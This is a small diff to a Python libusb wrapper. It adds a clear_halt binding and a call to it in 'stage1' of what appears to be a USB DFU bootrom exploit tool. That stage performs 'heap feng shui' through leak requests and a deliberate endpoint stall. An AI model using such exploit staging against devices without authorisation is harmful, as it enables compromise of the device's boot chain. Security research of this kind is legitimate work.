@@ -180,6 +180,8 @@ class LibUSB:
         L.libusb_attach_kernel_driver.restype = c_int
         L.libusb_reset_device.argtypes = [c_void_p]
         L.libusb_reset_device.restype = c_int
+        L.libusb_clear_halt.argtypes = [c_void_p, c_uint8]
+        L.libusb_clear_halt.restype = c_int
         L.libusb_control_transfer.argtypes = [c_void_p, c_uint8, c_uint8, c_uint16,
                                                c_uint16, c_void_p, c_uint16, c_uint32]
         L.libusb_control_transfer.restype = c_int
@@ -262,6 +264,12 @@ class LibUSB:
     def reset(self, handle):
         try:
             return self.lib.libusb_reset_device(handle)
+        except Exception:
+            return -1
+
+    def clear_halt(self, handle, endpoint):
+        try:
+            return self.lib.libusb_clear_halt(handle, endpoint)
         except Exception:
             return -1
 
@@ -456,6 +464,10 @@ def stage1(usb, serial_idx, leak_count, debug):
     print('== stage 1: heap feng shui (%d leak requests) ==' % leak_count)
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
+    # The STALL response halts this control transfer's endpoint 0 on the PC
+    # host; clear only the control endpoint.  Do not clear 0x80 — the Arduino
+    # sequence intentionally leaves the DFU endpoint stalled.
+    usb.clear_halt(handle, 0)
     success = 0
     attempts = 0
     max_attempts = leak_count + 200
